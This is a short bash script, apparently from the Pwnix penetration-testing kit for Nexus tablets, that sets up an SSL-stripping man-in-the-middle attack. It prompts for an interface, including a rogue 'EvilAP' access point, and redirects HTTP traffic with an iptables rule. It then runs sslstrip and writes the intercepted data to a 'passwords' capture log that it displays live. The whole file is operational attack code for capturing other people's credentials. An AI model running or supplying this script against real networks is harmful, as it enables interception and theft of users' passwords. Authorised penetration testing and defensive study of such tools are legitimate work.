#!/bin/bash
#SSLstripp script for sniffing on available interfaces


##################################################
f_identify_device(){
  # Function to determine whether current device is new pad or old pad
  # Checking to see if this is the old pad or the new pad:
  cat /proc/cpuinfo |grep grouper &> /dev/null
  pad_old_or_new=`echo $?`
  
  # If pad_old_or_new = 1 then current device is New Pad
  if [ $pad_old_or_new -eq 1 ]; then

    # New Pad's GSM interface is rmnet_usb0
    gsm_int="rmnet_usb0"
    else
    # Old Pad's GSM interface is rmnet0
    gsm_int="rmnet0"
  fi
}

##################################################
f_interface(){
  clear
  echo "Select which interface you would like to sniff on? (1-6):"
  echo
  echo "1. eth0  (USB ethernet adapter)"
  echo "2. wlan0  (Internal Nexus Wifi)"
  echo "3. wlan1  (USB TPlink Atheros)"
  echo "4. mon0  (monitor mode interface)"
  echo "5. at0  (Use with EvilAP)"
  echo "6. $gsm_int (Internal 3G GSM)"
  echo

  read -p "Choice: " interfacechoice

  case $interfacechoice in
    1) interface=eth0 ;;
    2) interface=wlan0 ;;
    3) interface=wlan1 ;;
    4) interface=mon0 ;;
    5) interface=at0 ;;
    6) interface=$gsm_int ;;
    *) f_interface ;;
esac
}


#Setup IPtables for ssltrip
f_ip_tables(){
  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
}

f_run(){
  #Path to sslstrip definitions:
  clear
  echo
  echo  "Logging to /opt/pwnix/captures/passwords/"
  echo
  sleep 2

  f_interface
  f_ip_tables

  logfile=/opt/pwnix/captures/passwords/sslstrip_$(date +%F-%H%M).log

  sslstrip -pfk -w $logfile  -l 8888 $interface &

  sleep 3
  echo
  echo
  tail -f $logfile
}

f_identify_device
f_run

